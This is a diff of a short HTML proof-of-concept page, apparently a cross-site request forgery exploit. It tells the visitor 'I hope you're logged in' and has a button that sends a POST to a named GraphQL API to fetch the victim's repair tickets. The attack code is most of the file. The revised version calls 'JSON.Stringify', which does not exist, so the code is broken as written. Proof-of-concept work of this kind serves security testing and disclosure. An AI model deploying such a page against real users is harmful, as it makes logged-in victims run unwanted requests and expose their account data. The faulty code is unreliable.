@@ -1,7 +1,9 @@
 <html>
   <body>
    
-  I hope you're logged in :)
+  I hope you're logged in. Press the button :)
+  <br>
+  <br>
     
   <input type="submit" value="Submit request" onclick="submit()">
 
@@ -9,10 +11,11 @@
     history.pushState('', '', '/')
     function submit() {
       var xmlhttp = new XMLHttpRequest();
-      var theUrl = "https://ap.app.helloanew.com/api/graphql";
-      xmlhttp.open("POST", theUrl);
+      var url = "https://ap.app.helloanew.com/api/graphql";
+      xmlhttp.open("POST", url);
       xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-      xmlhttp.send("{"operationName":"getMyTickets","variables":{},"query":"query getMyTickets {\n  myTickets {\n    id\n    unique_id\n    status_id\n    status_updated_at\n    user_description\n    created_at\n    service_group_id\n    service_group_path\n    repair_price_created_at\n    repair_price_expires_at\n    __typename\n  }\n}\n"}");
+      var payload = JSON.Stringify({"operationName":"getMyTickets","variables":{},"query":"query getMyTickets {\n  myTickets {\n    id\n    unique_id\n    status_id\n    status_updated_at\n    user_description\n    created_at\n    service_group_id\n    service_group_path\n    repair_price_created_at\n    repair_price_expires_at\n    __typename\n  }\n}\n"});
+      xmlhttp.send(payload);
     };
   </script>
   </body>
